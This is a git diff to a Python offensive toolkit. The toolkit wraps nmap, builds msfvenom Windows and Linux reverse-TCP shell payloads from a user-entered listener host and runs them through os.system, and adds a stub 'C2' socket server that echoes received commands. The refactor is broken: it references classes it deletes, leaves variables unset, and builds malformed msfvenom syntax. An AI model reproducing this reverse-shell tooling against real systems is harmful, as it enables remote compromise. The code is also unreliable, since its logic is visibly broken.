@@ -1,5 +1,6 @@
 import os
 import nmap 
+import socket
 
 class banner:
     def __init__(self,banner1,banner2,banner3):
@@ -19,21 +20,6 @@ class shell_stuff:
         self.msfv = msfv
 
 
-class shell_win: 
-    def __init__(self,oper_sys,exe_elf,shell_name):
-        self.oper_sys_win = oper_sys
-        self.exe_elf_win = exe_elf
-        self.shell_name_win = shell_name
-class shell_linux: 
-    def __init__(self,oper_sys,exe_elf,shell_name,xtype):
-        self.oper_sys = oper_sys 
-        self.exe_elf = exe_elf
-        self.shell_name = shell_name 
-        self.xtype = xtype 
-class misc:
-    def __init__(self,lhost):
-        self.lhost = lhost 
-
 
 menu.nmap = """ 
 NMAP Menu 
@@ -52,11 +38,10 @@ menu.main = """
 
 [1] Nmap Interface 
 [2] Start Python Http Server 
-[3] Shell ceration 
-[4]
+[3] Shells  
+[4] Start C2
 
 """
-#// menu non complete 
 
 banner.banner1 = "        Defensive Automation Remote Toolset"
 banner.banner2 = "        https://github.com/Richycam"
@@ -79,15 +64,15 @@ def flow_handler():
 
 
 def win_shells():
-    shell_win.oper_sys_win ="/windows/shell_reverse_tcp/"
-    shell_win.exe_elf_win = "-f exe"
-    shell_win.shell_name_win = "shell.exe"
+    oper_sys_win ="/windows/shell_reverse_tcp/"
+    exe_elf_win = "-f exe"
+    shell_name_win = "shell.exe"
 
 def linux_shells():
-    shell_linux.x_type = input("x86 or x64? \n DAT> ")
-    shell_linux.oper_sys = "/linux/{0}/shell_reverse_tcp/".format(shell_linux.x_type)
-    shell_linux.exe_elf = "-f elf"
-    shell_linux.shell_name = "shell.elf"
+    x_type = input("x86 or x64? \n DAT> ")
+    oper_sys = "/linux/{0}/shell_reverse_tcp/".format(shell_linux.x_type)
+    exe_elf = "-f elf"
+    shell_name = "shell.elf"
 
 def opt_1():
     clear()
@@ -133,14 +118,34 @@ def opt_3():
     
     misc.lhost = input("Lhost (Local Host) \n DAT> ")
     
-    alltogether_msf_win = ("msfvenom -p {0} {1} {2} > {3}").format(shell_win.oper_sys,misc.lhost,shell_win.exe_elf,shell_win.shell_name)
-    alltogether_msf = ("msfvenom -p {0} {1} {2} > {3}").format(shell_linux.oper_sys,misc.lhost,shell_linux.exe_elf,shell_linux.shell_name)
+    alltogether_msf_win = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys,lhost,exe_elf,shell_name)
+    alltogether_msf = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys,lhost,exe_elf,shell_name)
     if check_1 == "windows":
         os.system(alltogether_msf_win)
     elif check_1 == "linux":
         os.system(alltogether_msf)
     flow_handler()
     clear()
+
+def opt_4():
+    def start_server(host='127.0.0.1', port=65432):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind((host, port))
+            s.listen()
+            print(f"Server started at {host}:{port}")
+            conn, addr = s.accept()
+            with conn:
+                print(f"Connected by {addr}")
+                while True:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    print(f"Received command: {data.decode()}")
+                    response = f"Executed: {data.decode()}"
+                    conn.sendall(response.encode())
+
+    if __name__ == "__main__":
+        start_server()
 
 def main():
     clear()
@@ -165,4 +170,8 @@ def main():
             case "3":
                 opt_3() #Shell creator
                 continue
+            case "4":
+                opt_4() #C2 start
+                continue
+
 main()
